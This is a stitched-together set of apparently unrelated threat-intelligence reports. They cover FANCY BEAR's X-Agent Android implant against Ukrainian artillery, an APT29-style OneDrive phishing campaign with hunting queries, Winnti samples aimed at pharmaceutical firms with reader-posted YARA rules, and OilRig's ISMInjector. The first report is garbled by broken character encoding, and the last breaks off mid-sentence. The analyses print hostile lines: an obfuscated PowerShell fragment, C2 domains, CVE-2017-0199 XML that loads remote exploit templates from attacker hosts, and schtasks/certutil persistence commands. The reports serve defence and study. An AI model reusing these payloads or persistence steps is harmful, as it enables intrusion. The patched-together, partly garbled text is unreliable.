Based on the file creation timestamps as well as the app signing process, which occurred on 28 March 2013, CrowdStrike has determined that the app was developed sometime between 20 February and 13 April 2013. Shortly after that time frame, on 28 April 2013, an individual bearing the same name as the application™s developer promoted the application on Russian vKontakte3 pages associated with the artillery forces. The promotion of the program was likely limited to social media, and the distribution was controlled from the author™s main page, «˜˝˚ˆ (translation: \"Modern combat software\").4 As an additional control measure, the program was only activated for use after the developer was contacted and issued a code to the individual downloading the application.No evidence of the application has been observed on the Android app store, making it unlikely that the app was distributed via that platform. The control measures established by the developer to limit the use and proliferation of the ˜˚˛˝-˙30.apk application, coupled with its unique purpose, make its broad distribution on the Android store improbable.At the time of this writing, it is unclear to what degree and for how long this specific application was utilized by the entirety of the Ukrainian Artillery Forces. Based on open source reporting, social media posts, and video evidence, CrowdStrike assesses that ˜˚˛˝-˙30.apk was potentially used through 2016 by at least one artillery unit operating in eastern Ukraine. RECONNAISSANCE, DEVELOPMENT AND DISTRIBUTION OF THE MALICIOUS APPLICATION RECONNAISSANCEGiven the estimated development timeframe and the promotional period for the benign ˜˚˛˝-˙30.apk application, the program was likely available online for distribution after late April 2013. CrowdStrike Intelligence assesses that the application likely came to the attention of Russia-based adversaries around this time frame as a result of ongoing Russian reconnaissance associated with the revolution in Ukraine. Actors with a nexus to Russia regularly monitor social media sites in order to better understand or formulate operations against their targets. CrowdStrike Intelligence has noted instances in which some Russia-based actors and attribution front groups have leveraged information obtained from Ukrainian social media sites in order to perform operations. The most notable recent example of this was in the case of extortion-based threats directed against the Polish Government.5 In this particular case, the perpetrators likely sought out openly available account information from a vKontakte page belonging to a Ukrainian citizen, who was soliciting donations to aid volunteer soldiers fighting in eastern Ukraine. The adversary then used this profile information, in conjunction with the name \"Pravyy Sector,\" to make it appear as though the extortion threats against the Polish government were originating from an ultranationalist Ukrainian group. CrowdStrike has assessed that by performing this type of deceptive operation the perpetrator likely sought to make it appear as though Ukrainian interests were threatening the Polish government. In addition, because the individual account hijacked for this operation had been used to try to raise funds for Ukrainian forces, the adversary may have been trying to aggravate Western governments enough to freeze the individual™s accounts. The attack did not appear to achieve its intended result. Poland rebuffed the threats, and the owner of the vKontakte page denounced any involvement in the threat. Subsequently the Pravyy Sector group scrubbed their social media page of much of the information associated with this failed operation. This particular incident is an example of how a disinformation operation is staged. While this incident is not likely to be related to the development of the X-Agent Android variant, it demonstrates the reconnaissance and pre-planning tactics that precede the rest of a campaign. Development and DistributionCrowdStrike has discovered indications that as early as 2015 FANCY BEAR likely developed X-Agent applications for the iOS environment, targeting \"jailbroken\" Apple mobile devices. The use of the X-Agent implant in the original ˜˚˛˝-˙30.apk application appears to be the first observed case of FANCY BEAR malware developed for the Android mobile platform. On 21 December 2014 the malicious variant of the Android application was first observed in limited public distribution on a Russian language, Ukrainian military forum. A late 2014 public release would place the development timeframe for this implant sometime between late-April 2013 and early December 2014. During that proposed development timeframe, a number of significant events unfolded between Ukraine, Russia, and the international community. Most notably, Russian attempts to influence Ukrainian-EU relations resulted in the large-scale, Maidan protest movement, eventually resulting in the ouster of then-president Victor YANUKOVYCH, the invasion and annexation of the Crimean Peninsula by Russia, and the protracted armed conflict in eastern Ukraine. Therefore, the creation of an application that targets some of the front line forces pivotal in Ukrainian defense on the eastern front would likely be a high priority for Russian adversary malware developers seeking to turn the tide of the conflict in their favor. CrowdStrike Intelligence has assessed that the distribution of the malicious application targeted the very artillery units for which the benign application was developedŠbrigades operating in eastern Ukraine on the frontlines of the conflict with Russian-backed separatist forces during the early stages of the conflict in late-2014. This assessment is based on a number of factors, but chief among them is the likelihood that a military member would only trust and use an application designed to calculate something as critical as targeting data if it was developed and promoted by a member of their own forces. The type of operational activity described here suggests an extremely sophisticated understanding of the target that only a skilled adversary would likely possess. By late December 2014, the total number of Russian forces in the region was approximately 10,000 troops.6 Because the Android malware could facilitate gross position information, its successful deployment could have facilitated anticipatory awareness of Ukrainian artillery force troop movement, thus providing Russian forces with useful strategic planning information. Indeed, the 55th Artillery Brigade and similar artillery units operated frequently against pro-Russian separatists in eastern Ukraine. A video posted on 18 October 20157 specifically shows them employing the ˜˚˛˝-˙30.apk application and operating in the vicinity of eastern Ukraine. The choice of the Russian language character set in the application further underscores the targeting of forces within eastern Ukraine, as Russian is the predominant language utilized in that region. An assessment of languages spoken by region based on the most recent census information illustrates the permeation of the Russian language in that region and highlights the value of providing Russian in the malicious ˜˚˛˝-˙30.apk application. One alternative theory regarding the use of the Russian language in the application could be that targeting may have been directed at pro-Russian ˜CROWDSTRIKE INTELLIGENCE HAS ASSESSED THAT THE DISTRIBUTION OF THE MALICIOUS APPLICATION TARGETED THE VERY ARTILLERY UNITS FOR WHICH THE BENIGN APPLICATION WAS DEVELOPED˛BRIGADES OPERATING IN EASTERN UKRAINE ON THE FRONTLINES OF THE CONFLICT WITH RUSSIAN˜BACKED SEPARATIST FORCES DURINGTHE EARLY STAGES OF THE CONFLICT IN LATE˜2014. ˚ forces operating in eastern Ukraine. A relevant and likely counterargument for this theory, however, is that Russian forces likely have employed fire support systems and other technologies that can already calculate targeting data, negating the need for an application to perform this task. Additionally, the application was initially developed by a member of the Ukrainian army. An opposing force would probably not adopt technology developed by the enemy for use on the battlefield. OUTCOMES AND CONCLUSION The eastern Ukrainian front has been markedly impacted by heavy fighting involving Russian troops and pro-Russian rebel fighters deployed to this region. Artillery forces on both sides of the conflict have served an important role. For Ukrainian troops, artillery forces have also shouldered a heavy cost. According to an update provided in March 2017 by the International Institute for Strategic Studies (IISS) Research Associate for Defence and Military Analysis, Henry Boyd, \"excluding the Naval Infantry battalion in the Crimea which was effectively captured wholesale, the Ukrainian Armed Forces lost between 15% and 20% of their pre-war DŒ30 inventory in combat operations. Between July and August 2014, Russian backed forces launched some of the most decisive attacks against Ukrainian forces, resulting in significant loss of life, weaponry, and territory. According to open sources, Ukrainian service personnel from the 24th and 72nd Mechanized Brigade, as well as the 79th Airborne Brigade, were among the units to have suffered casualties. International monitoring groups later assessed some of the attacks were likely to have come from inside Russian territory.9 A malware-infected ˜˚˛˝-˙30.apk application probably could not have provided all the necessary data required to directly facilitate the types of tactical strikes that occurred between July and August 2014. Eyewitness accounts from individuals within the impacted units reported seeing an unmanned aerial vehicle (UAV) used in the area prior to one attack, underscoring the need for precise locational data for these particular strikes and introducing the possibility UKRANIAN RUSSIAN OTHER UNCLEAR UKRANIAN & RUSSIAN EQUALLY ˜˚˛˝˙ ˆˇ˛˚˙ ˘˘˙ ˘ˆ˛˙ ˛˜˙ ˚˛˜˙ ˛˝˙ ˘ˇ˛˙ ˘˛˙ ˘ ˛˙ ˚˛˜˙ ˙ ˛˚˙ ˚˙WEST CENTER SOUTH EAST DONBASS ˝˙ ˛˙ ˛˙ ˘˙ ˛˚˙ ˙ ˛˜˙ ˛˝˙ ˛˜˙ LANGUAGES SPOKEN BY REGION Distribution of Russian/Ukrainian Language Use in Ukraine 8 ˜CROWDSTRIKE INTELLIGENCE ASSESSES A TOOL SUCH AS THIS HAS THE POTENTIAL ABILITY TO MAP OUT A UNIT™S COMPOSITION AND HIERARCHY, DETERMINE THEIR PLANS, AND EVEN TRIANGULATE THEIR APPROXIMATE LOCATION ˚that the Android malware served to support the reconnaissance role of traditional battlefield assets. Although traditional overhead intelligence surveillance and reconnaissance (ISR) assets were likely still needed to finalize tactical movements, the ability of this application to retrieve communications and gross locational data from infected devices, could provide insight for further planning, coordination, and tasking of ISR, artillery assets, and fighting forces. The X-Agent Android variant does not exhibit a destructive function and does not interfere with the function of the original ˜˚˛˝-˙30.apk application. Therefore, CrowdStrike Intelligence has assessed that the likely role of this malware is strategic in nature. The capability of the malware includes gaining access to contacts, Short Message Service (SMS) text messages, call logs, and internet data, and FANCY BEAR would likely leverage this information for its intelligence and planning value. CrowdStrike Intelligence assesses a tool such as this has the potential ability to map out a unit™s composition and hierarchy, determine their plans, and even triangulate their approximate location. This type of strategic analysis can enable the identification of zones in which troops are operating and help prioritize assets within those zones for future targeting. The development of the X-Agent Android malware represents an expansion of FANCY BEAR capabilities in terms of mobile malware, and illustrates the practical application of full-spectrum combat as envisioned in the eponymous doctrinal writings of General Valery GERASIMOV. As a part of full-spectrum operations in Ukraine, Russia-based adversaries have leveraged malware on the battlefield, in the civil sector, and against critical infrastructure. They have also engaged in aggressive information operations in the media. In relation to this broader picture of Russian computer operations, the approach to targeting mobile smartphone and tablet devices in order to gain strategic insight into communications is a tactic that cannot be disregarded. CrowdStrike assesses that the observed and described X-Agent implant targeting Ukrainian military Android devices running the ˜˚˛˝-˙30.apk application is likely only the initial iteration of this type of malware. While this malware was initially discovered in a battlefield environment, an adversary could also leverage it in attacks against non-military targets. Mobile devices and internet-connected technology have increasingly proliferated civilian and military organizations. This technique may very likely be deployed in the political, government, or non-governmental sectors in the near future. 1-The name ˜˚˛˝-˙30.apk is an abbreviated variant of 30 which translates to Correction-D30.2-For more information, contact CrowdStrike 3-vKontakte is a Russian social media networking site alike in layout and functionality to Facebook. 4-http://programs-art.at.ua5-For more information, contact CrowdStrike Institute, March 2015, https://rusi.org/sites/default/files/201503_bp_ russian_forces_in_ukraine.pdf7-https://www.youtube.com/watch?v=qp-7e_ZGH8I8-Data for image circa 2015.

In the days leading to the Reuters publication, Microsoft researchers were closely tracking the same campaign.\\nOur sensors revealed that the campaign primarily targeted public sector institutions and non-governmental organizations like think tanks and research centers, but also included educational institutions and private-sector corporations in the oil and gas, chemical, and hospitality industries.\\nMicrosoft customers using the complete Microsoft Threat Protection solution were protected from the attack. Behavior-based protections in multiple Microsoft Threat Protection components blocked malicious activities and exposed the attack at its early stages. Office 365 Advanced Threat Protection caught the malicious URLs used in emails, driving the blocking of said emails, including first-seen samples. Meanwhile, numerous alerts in Windows Defender Advanced Threat Protection exposed the attacker techniques across the attack chain.\\nThird-party security researchers have attributed the attack to a threat actor named APT29 or CozyBear, which largely overlaps with the activity group that Microsoft calls YTTRIUM. While our fellow analysts make a compelling case, Microsoft does not yet believe that enough evidence exists to attribute this campaign to YTTRIUM.\\nRegardless, due to the nature of the victims, and because the campaign features characteristics of previously observed nation-state attacks, Microsoft took the step of notifying thousands of individual recipients in hundreds of targeted organizations. As part of the Defending Democracy Program, Microsoft encourages eligible organizations to participate in Microsoft AccountGuard, a service designed to help these highly targeted customers protect themselves from cybersecurity threats.\\nAttack overview\\nThe aggressive campaign began early in the morning of Wednesday, November 14. The targeting appeared to focus on organizations that are involved with policy formulation and politics or have some influence in that area.\\nPhishing targets in different industry verticals\\nAlthough targets are distributed across the globe, majority are located in the United States, particularly in and around Washington, D.C. Other targets are in Europe, Hong Kong, India, and Canada.\\nPhishing targets in different locations\\nThe spear-phishing emails mimicked sharing notifications from OneDrive and, as noted by Reuters, impersonated the identity of individuals working at the United States Department of State. If recipients clicked a link on the spear-phishing emails, they began an exploitation chain that resulted in the implantation of a DLL backdoor that gave the attackers remote access to the recipients’ machines.\\nAttack chain\\nAnalysis of the campaign\\nDelivery\\nThe spear-phishing emails used in this attack resemble file-sharing notifications from OneDrive.\\nThe emails contain a link to a legitimate, but compromised third-party website:\\nhxxps://www.jmj.com/personal/nauerthn_state_gov/TUJE7QJl[random string]\\nThe random strings are likely used to identify distinct targeted individuals who clicked on the link. However, all observed variants of this link redirect to a specific link on the same site:\\nhxxps://www.jmj.com/personal/nauerthn_state_gov/VFVKRTdRSm\\nWhen users click the link, they are served a ZIP archive containing a malicious LNK file. All files in a given attack have the same file name, for example, ds7002.pdf, ds7002.zip, and ds7002.lnk.\\nInstallation\\nThe LNK file represents the first stage of the attack. It executes an obfuscated PowerShell command that extracts a base64-encoded payload from within the LNK file itself, starting at offset 0x5e2be and extending 16,632 bytes.\\nEncoded content in the LNK file\\nThe encoded payload—another heavily obfuscated PowerShell script—is decoded and executed:\\nDecoded second script\\nThe second script carves out two additional resources from within the .LNK file:\\nds7002.PDF (A decoy PDF)\\ncyzfc.dat (The first stage implant)\\nCommand and control\\nThe first-stage DLL, cyzfc.dat, is created by the PowerShell script in the path %AppData%\\\\Local\\\\cyzfc.dat. It is a 64-bit DLL that exports one function: PointFunctionCall.\\nThe PowerShell script then executes cyzfc.dat by calling rundll32.exe. After connecting to the first-stage command-and-control server at pandorasong[.]com (95.216.59.92), cyzfc.dat begins to install the final payload by taking the following actions:\\nAllocate a ReadWrite page for the second-stage payload\\nExtract the second-stage payload as a resource\\nTake a header that is baked into the first payload with a size 0xEF bytes\\nConcatenate the header with the resource, starting at byte 0x12A.\\nDe-XOR the second-stage payload with a rolling XOR (ROR1), starting from key 0xC5.\\nThe second stage is an instance of Cobalt Strike, a commercially available penetration testing tool, which performs the following steps:\\nDefine a local named pipe with the format \\\\\\\\.\\\\pipe\\\\MSSE-<number>-server, where <number> is a random number between 0 and 9897\\nConnecting to the pipe, write it global data with size 0x3FE00\\nImplement a backdoor over the named pipe:\\nRead from the pipe (maximum 0x3FE00 bytes) to an allocated buffer\\nDeXOR the payload onto a new RW memory region, this time with a much simple XOR key: simple XORing every 4 bytes with 0x7CC2885F\\nTurn the region to be RX\\nCreate a thread that starts running the payload’\\nThe phase that writes to global data to the pipe actually writes a third payload. That payload is XORed with the same XORing algorithm used for reading. When decrypted, it forms a PE file with a Meterpreter header, interpreting instructions in the PE header and moving control to a reflective loader:\\nThe third payload eventually gets loaded and connects to the command-and-control (C&C) server address that is baked-in inside configuration information in the PE file. This configuration information is de-XORed at the third payload runtime:\\nThe configuration information itself mostly contains C&C information:\\nCobaltStrike is a feature-rich penetration testing tool that provides remote attackers with a wide range of capabilities, including escalating privileges, capturing user input, executing arbitrary commands through PowerShell or WMI, performing reconnaissance, communicating with C&C servers over various protocols, and downloading and installing additional malware.\\nEnd-to-end defense through Microsoft Threat Protection\\nMicrosoft Threat Protection is a comprehensive solution for enterprise networks, protecting identities, endpoints, user data, cloud apps, and infrastructure. By integrating Microsoft services, Microsoft Threat Protection facilitates signal sharing and threat remediation across services. In this attack, Office 365 Advanced Threat Protection and Windows Defender Advanced Threat Protection quickly mitigated the threat at the onset through durable behavioral protections.\\nOffice 365 ATP has enhanced phishing protection and coverage against new threats and polymorphic variants. Detonation systems in Office 365 ATP caught behavioral markers in links in the emails, allowing us to successfully block campaign emails—including first-seen samples—and protect targeted customers. Three existing behavioral-based detection algorithms quickly determined that the URLs were malicious. In addition, Office 365 ATP uses security signals from Windows Defender ATP, which had a durable behavior-based antivirus detection (Behavior:Win32/Atosev.gen!A) for the second-stage malware.\\xa0If you are not already secured against advanced cyberthreat campaigns via email, begin a free Office 365 E5 trial today.\\nSafe Links protection in Office 365 ATP protects customers from attacks like this by analyzing unknown URLs when customers try to open them. Zero-hour Auto Purge (ZAP) actively removes emails post-delivery after they have been verified as malicious—this is often critical in stopping attacks that weaponize embedded URLs after the emails are sent.\\nAll of these protections and signals on the attack entry point are shared with the rest of the Microsoft Threat Protection components. Windows Defender ATP customers would see alerts related to the detection of the malicious emails by Office 365 ATP, as well the behavior-based antivirus detection.\\nWindows Defender ATP detects known filesystem and network artifacts associated with the attack. In addition, the actions of the LNK file are detected behaviorally. Alerts with the following titles are indicative of this attack activity:\\nArtifacts associated with an advanced threat detected\\nNetwork activity associated with an advanced threat detected\\nLow-reputation arbitrary code executed by signed executable\\nSuspicious LNK file opened\\nNetwork protection blocks connections to malicious domains and IP addresses. The following attack surface reduction rule also blocks malicious activities related to this attack:\\nBlock executable files from running unless they meet a prevalence, age, or trusted list criteria\\nThrough Windows Defender Security Center, security operations teams could investigate these alerts and pivot to machines, users, and the new Incidents view to trace the attack end-to-end. Automated investigation and response capabilities, threat analytics, as well as advanced hunting and new custom detections, empower security operations teams to defend their networks from this attack.\\xa0To test how Windows Defender ATP can help your organization detect, investigate, and respond to advanced attacks, sign up for a free Windows Defender ATP trial.\\nThe following Advanced hunting query can help security operations teams search for any related activities within the network:\\n//Query 1: Events involving the DLL container\\nlet fileHash = \"9858d5cb2a6614be3c48e33911bf9f7978b441bf\";\\nfind in (FileCreationEvents, ProcessCreationEvents, MiscEvents,\\nRegistryEvents, NetworkCommunicationEvents, ImageLoadEvents)\\nwhere SHA1 == fileHash or InitiatingProcessSHA1 == fileHash\\n| where EventTime > ago(10d)\\n//Query 2: C&C connection\\nNetworkCommunicationEvents\\n| where EventTime > ago(10d)\\n| where RemoteUrl == \"pandorasong.com\"\\n//Query 3: Malicious PowerShell\\nProcessCreationEvents\\n| where EventTime > ago(10d)\\n| where ProcessCommandLine contains\\n\"-noni -ep bypass $zk=\\' JHB0Z3Q9MHgwMDA1ZTJiZTskdmNxPTB4MDAwNjIzYjY7JHRiPSJkczcwMDIubG5rIjtpZiAoLW5vdChUZXN0LVBhdGggJHRiKSl7JG9lPUdldC1DaGlsZEl0\"\\n//Query 4: Malicious domain in default browser commandline\\nProcessCreationEvents\\n| where EventTime > ago(10d)\\n| where ProcessCommandLine contains\\n\"https://www.jmj.com/personal/nauerthn_state_gov\"\\n//Query 5: Events involving the ZIP\\nlet fileHash = \"cd92f19d3ad4ec50f6d19652af010fe07dca55e1\";\\nfind in (FileCreationEvents, ProcessCreationEvents, MiscEvents,\\nRegistryEvents, NetworkCommunicationEvents, ImageLoadEvents)\\nwhere SHA1 == fileHash or InitiatingProcessSHA1 == fileHash\\n| where EventTime > ago(10d)\\nThe provided queries check events from the past ten days.

Winnti is now targeting pharmaceutical companies\\nBy Dmitry Tarakanov\\non June 22, 2015. 2:19 pm\\nFor a long time the Winnti group had been considered as a Chinese threat actor targeting gaming companies specifically. Recently,\\xa0we’ve seen information indicating that the scope of targets can be wider and is no longer limited to the entertainment business. We actually track samples of Winnti malware all the time, but so far we haven’t been\\xa0able to catch one with solid clues indicating other targeted industries. Also our visibility as a vendor does not cover every company in the world (at least so far ;)) and the Kaspersky Security Network (KSN) did not reveal other attacks except those against gaming companies. Well, sometimes targeted entities have included\\xa0telecommunication companies, or better, large holdings, but it seems that at least one of their businesses was in some way related to the production or distribution of computer games.\\nIn April Novetta released its excellent report on the Winnti malware spotted in the operations of Axiom group. The Axiom group has been presented as an advanced Chinese threat\\xa0actor carrying out cyber-espionage attacks against a whole range of different industries. For us, the Novetta\\xa0report was another source of intelligence that Winnti was already expanding beyond\\xa0online games. One of the recent Winnti samples we found appears to confirm this as well.\\nThe new sample belongs to one of the Winnti versions described in Novetta’s report – Winnti 3.0. This is one of the Dynamic Link Libraries composing this RAT (Remote Access Trojan) platform – the worker library (which in essence is the RAT DLL) with the internal name w64.dll and the exported functions work_end and work_start. Since, as usual, this component is stored on the disk with the strings and much of other data in the PE header removed/zeroed, it is impossible to restore the compilation date of this DLL. But this library includes two drivers compiled on August 22 and September 4, 2014. The sample has an encrypted configuration block placed in overlay. This block may include a tag for the sample – usually it is a campaign ID or victim ID/name. This time the operators put such tag in the configuration and it turned out to be the name of the well-known global pharmaceutical company headquartered in Europe:\\nPic.1 Configuration block\\nBesides the sample tag, the configuration block includes the names of other files involved in the working of the RAT platform and the service name (Adobe Service), after which malware is installed. The presence of the following files could indicate that the system has been compromised:\\nC:\\\\Windows\\\\TEMP\\\\tmpCCD.tmp\\nServiceAdobe.dll\\nksadobe.dat\\nOne of the mentioned drivers (a known, malicious Winnti network rootkit) was signed with a stolen certificate of a division of a huge Japanese conglomerate. Although this division is involved in microelectronics manufacturing, other business directions of the conglomerate include development and production of drugs as well as\\xa0medical equipment.\\nAlthough the nature of the involvement of Winnti operators, who were earlier perceived to be a threat only to the online gaming industry, in the activities of other cyber-espionage teams still remains rather obscure, the evidence is there. From now on, when you see Winnti mentioned, don’t think just about gaming companies; consider also at least targeted telecoms and big pharma companies.\\nHere are the samples in question:\\n8e61219b18d36748ce956099277cc29b – Backdoor.Win64.Winnti.gy\\n5979cf5018c03be2524b87b7dda64a1a – Backdoor.Win64.Winnti.gf\\nac9b247691b1036a1cdb4aaf37bea97f – Rootkit.Win64.Winnti.ai\\nAPT Cyber espionage Digital Certificates Malware Winnti\\nShare post on:\\nFacebook\\nTwitter\\nRelated Posts\\nAPT trends report Q1 2020\\nHiding in plain sight: PhantomLance walks into a market\\nYARA webinar follow up\\nThere are 3 comments\\nJose Ramon Palanco\\nPosted on\\t\\t\\t\\t\\t\\t\\tJune 23, 2015. 4:21 am\\nWe have discovered another file related: b8ffea5aa357e8bac5efc03f8e202292\\nYou can use this Yara signature to track related files:\\nrule WinntiPharma\\n{\\nmeta:\\nauthor = “Jose Ramon Palanco”\\ncopyright = “Drainware, Inc.”\\ndate = “2015-06-23”\\ndescription = “Winnti targeting pharmaceutical organizations”\\nref = “htm://securelist.com/blog/research/70991/games-are-over/”\\nstrings:\\n$s0 = “Cookie: SN=”\\n$s1 = “{3ec05b4a-ea88-1378-3389-66706ba27600}”\\n$s2 = “{4D36E972-E325-11CE-BFC1-08002BE10318}”\\n$s3 = “master secret”\\n$s4 = “MyEngineNetEvent”\\ncondition:\\nall of ($s*)\\n}\\nReply\\nJose Ramon Palanco\\nPosted on\\t\\t\\t\\t\\t\\t\\tJune 23, 2015. 4:38 am\\nWe have discovered another related files:\\nb8ffea5aa357e8bac5efc03f8e202292\\n80f37df0d062fa4ddaace213c2883da5\\nYou can use this Yara signature to track related files:\\nrule WinntiPharma\\n{\\nmeta:\\nauthor = “Jose Ramon Palanco”\\ncopyright = “Drainware, Inc.”\\ndate = “2015-06-23”\\ndescription = “Winnti targeting pharmaceutical organizations”\\nref = “htm://securelist.com/blog/research/70991/games-are-over/”\\nstrings:\\n$s0 = “Cookie: SN=”\\n$s1 = “{3ec05b4a-ea88-1378-3389-66706ba27600}”\\n$s2 = “{4D36E972-E325-11CE-BFC1-08002BE10318}”\\n$s3 = “master secret”\\n$s4 = “MyEngineNetEvent”\\ncondition:\\nall of ($s*)\\n}\\nReply\\nLucie Ellis\\nPosted on\\t\\t\\t\\t\\t\\t\\tJuly 7, 2015. 12:11 pm\\nHi Dmitry,\\nInteresting blog post.

When we first discovered the OilRig attack campaign in May 2016, we believed at the time it was a unique attack campaign likely operated by a known, existing threat group. As we have progressed in our research and uncovered additional attack phases, tooling, and infrastructure as discussed in our recent posting “Striking Oil: A Closer Look at Adversary Infrastructure”, it has become apparent that the threat group responsible for the OilRig attack campaign is likely to be a unique, previously unknown adversary. Additionally, others have been referring to the group responsible for the OilRig campaign itself as the OilRig group as well. To that end, we are elevating the OilRig attack campaign to be known as the OilRig group.\\nIn July 2017, we observed the OilRig group using a tool they developed called ISMAgent in a new set of targeted attacks. The OilRig group developed ISMAgent as a variant of the ISMDoor Trojan. In August 2017, we found this threat group has developed yet another Trojan that \\xa0they call ‘Agent Injector’ with the specific purpose of installing the ISMAgent backdoor. We are tracking this tool as ISMInjector. It has a sophisticated architecture and contains anti-analysis techniques that we have not seen in previous tools developed by this threat group. The complex structure and inclusion of new anti-analysis techniques may suggest that this group is increasing their development efforts in order to evade detection and gain higher efficacy in their attacks.\\nThe Attack\\nOn August 23, 2017, we observed OilRig targeting an organization within the United Arab Emirates government. The attack involved a spear-phishing email that had a subject of “Importan Issue” and two Zip archives attached, as seen in Figure 1. Note that “Important” is misspelled in the sample as shown below.\\nFigure 1 Delivery email that contains two Zip archives that contain the malicious delivery documents\\nThe message body in the attack email contains an image that is hosted on a remote server. As shown in Figure 2, hovering over the image shows that the URL link is to an image hosted at “www.cdnakamaiplanet[.]com” which we have reason to believe is an adversary owned domain. It is likely that the image was embedded to track if the recipient opened the email or not.\\nFigure 2 URL associated with image included in delivery email\\nAnother interesting facet of this attack is that the email addresses in the “To” and “From” fields are from addresses from the same domain. Our initial assumption was that the email address in the “From” field was likely spoofed. Additional analysis of the email headers revealed that it did not contain a list of external email servers used to deliver the message as expected from a spoofed email; instead, we discovered the following string within the email headers:\\nClient=OWA;Mozilla/5.0 (Windows NT 6.3; rv:36.0) Gecko/20100101 Firefox/36.04;\\nThis string in the header suggests that the OilRig actor is likely to have used the targeted organization’s Outlook Web Access (OWA) to send the phishing email using Firefox 36.\\nUsing information from our research in the Striking Oil blog, we know the OilRig group has conducted credential harvesting campaigns specifically by emulating OWA login sites. Based on that research and this observation, we postulate that the OilRig group gathered credentials to a legitimate user’s OWA account and logged into the user’s account to send phishing attacks to other individuals within the same, targeted organization. Also, Firefox 36 was released in February 2015; since this email was sent August 2017, we believe it suggests the actors are using an outdated version of Firefox to log into the target organization’s OWA.\\nThe Delivery\\nThe August 23, 2017 phishing attack contained two Zip archives to the email, “Issue-doc.zip” and “Issue-doc1.zip”. Each Zip attachment contains one file, with “Issue.doc” within “Issue-doc.zip” and “Issue.dot” within “Issue-doc1.zip”. The “Issue.doc” and “Issue.dot” files are both malicious documents that will attempt to run in Microsoft Word.\\nIssue.doc is a Word document that contains a malicious macro that the actors attempt to trick the victim into executing by instructing the user to click the Enable Content button as shown in Figure 3. We track this malicious delivery document as ThreeDollars.\\nFigure 3 Malicious “ThreeDollars” Microsoft Word Document\\nOnce enabled, the macro reads in the initial document, searches the data for a delimiter of “###$$$” to find the base64 encoded payload then writes the encoded payload to the file %APPDATA%\\\\Base.txt. The following shows a hexdump of the delimiter followed by the encoded payload:\\n00088200\\n23 23 23 24 24 24 54 56\\n71 51 41 41 4d 41 41 41\\n|###$$$TVqQAAMAAA|\\n00088210\\n41 45 41 41 41 41 2f 2f\\n38 41 41 4c 67 41 41 41\\n|AEAAAA//8AALgAAA|\\n00088220\\n41 41 41 41 41 41 51 41\\n41 41 41 41 41 41 41 41\\n|AAAAAAQAAAAAAAAA|\\n00088230\\n41 41 41 41 41 41 41 41\\n41 41 41 41 41 41 41 41\\n|AAAAAAAAAAAAAAAA|\\n..snip..\\n12345\\n00088200\\xa0\\xa023 23 23 24 24 24 54 56\\xa0\\xa071 51 41 41 4d 41 41 41\\xa0\\xa0|###$$$TVqQAAMAAA|00088210\\xa0\\xa041 45 41 41 41 41 2f 2f\\xa0\\xa038 41 41 4c 67 41 41 41\\xa0\\xa0|AEAAAA//8AALgAAA|00088220\\xa0\\xa041 41 41 41 41 41 51 41\\xa0\\xa041 41 41 41 41 41 41 41\\xa0\\xa0|AAAAAAQAAAAAAAAA|00088230\\xa0\\xa041 41 41 41 41 41 41 41\\xa0\\xa041 41 41 41 41 41 41 41\\xa0\\xa0|AAAAAAAAAAAAAAAA|..snip..\\nThe macro runs a PowerShell command that will decode the contents of the %APPDATA%\\\\Base.txt file and save it to the file %PUBLIC%\\\\Libraries\\\\servicereset.exe, which it will then execute. The “servicereset.exe” file is a new tool in OilRig’s arsenal that we call ISMInjector, which we will discuss in detail in the next section.\\nIssue.dot is a file that attempts to exploit CVE-2017-0199 Microsoft Word Office/WordPad Remote Code Execution Vulnerability using the following code:\\n<relationship ID =\"rId5\"\\nType=\"http://schemas.openxmlformats.org/officeDocument/2006/relationships/ole\\nObject\" Target=\"http://www.msoffice-\\ncdn.com/updatecdnsrv/prelocated/owa/auth/template.rtf\\n\" TargetMode=\"External\"/>\\n12345\\n<relationship ID =\"rId5\"Type=\"http://schemas.openxmlformats.org/officeDocument/2006/relationships/oleObject\" Target=\"http://www.msoffice-cdn.com/updatecdnsrv/prelocated/owa/auth/template.rtf\" TargetMode=\"External\"/>\\nAs displayed by the code example above, Index.dot file attempts to load a malicious exploit document hosted at “msoffice-cdn[.]com”, which is the same URL that hosted the exploit document used in an attack that ClearSky published on August 28, 2017. By correlating artifacts found in Index.dot, we discovered another sample attempting to exploit CVE-2017-0199 used in a separate attack, this time using “office365-management[.]com” as the C2 domain.\\n<Relationship Id=\"rId5\"\\nType=\"http://schemas.openxmlformats.org/officeDocument/2006/relationships/ole\\nObject\" Target=\"http://office365-management.com/updatejuly/template.rtf\"\\nTargetMode=\"External\"/>\\n1234\\n<Relationship Id=\"rId5\" Type=\"http://schemas.openxmlformats.org/officeDocument/2006/relationships/oleObject\" Target=\"http://office365-management.com/updatejuly/template.rtf\" TargetMode=\"External\"/>\\nThe resulting payload from this related delivery document is an ISMAgent Trojan that is configured to use “msoffice365update[.]com” as its C2 server. Please reference our previous blog on ISMAgent for more information on this Trojan.\\nISMInjector\\nUltimately, the payload delivered by ThreeDollars is a new tool that we track as ISMInjector. As its name suggests, ISMInjector is a Trojan that is responsible for injecting a Trojan into another process. The payload embedded within the ISMInjector sample delivered in this attack is a variant of the ISMAgent backdoor that we had discussed in detail in our blog discussing a targeted attack on a Saudi Arabian technology company.\\nAt face value, ISMInjector is obfuscated with the off-the-shelf SmartAssembly .NET obfuscator created by red-gate.com. The first execution of ISMInjector starts by copying itself to %localappdata%\\\\srvBS.txt and enables persistent access to the system. The code achieves persistence by referencing two resources that contain commands the code will execute by running them within a command prompt process, as seen in the following screenshot:\\nThe two resources that contain commands that ISMInjector uses for persistence are named “Tsk1” and “Tsk2”. The specific commands within each of these resources are within Table 1. At a high level, the“Tsk1” command creates a scheduled task named “ReportHealth” that is meant to run a payload saved to “%localappdata%\\\\srvHealth.exe” every 4 minutes. The “Tsk2” command creates a scheduled task that runs every 2 minutes that is responsible for saving the payload to srvHealth.exe. This task saves the payload to this location using the “certutil” command to decode the original payload saved to “srvBS.txt”.\\nResource Name\\nResource Value\\nTsk1\\nSchTasks /Create /SC MINUTE /MO 4 /TN \\\\”ReportHealth\\\\” /TR \\\\”%localappdata%\\\\\\\\srvHealth.exe\\\\” /f\\nTsk2\\nSchTasks /Create /SC MINUTE /MO 2 /TN \\\\”LocalReportHealth\\\\” /TR \\\\”cmd.exe /c certutil -decode %localappdata%\\\\\\\\srvBS.txt %localappdata%\\\\\\\\srvHealth.exe && schtasks /DELETE /tn LocalReportHealth /f && del %localappdata%\\\\\\\\srvBS.txt\\\\””\\nTable 1 Resources in ISMInjector containing commands for persistence\\nSubsequent executions of the ISMInjector sample from srvHealth.exe will execute its functional code. ISMInjector’s functional code is split into two different embedded modules named Inner.dll and Joiner.dll that work in conjunction to inject an 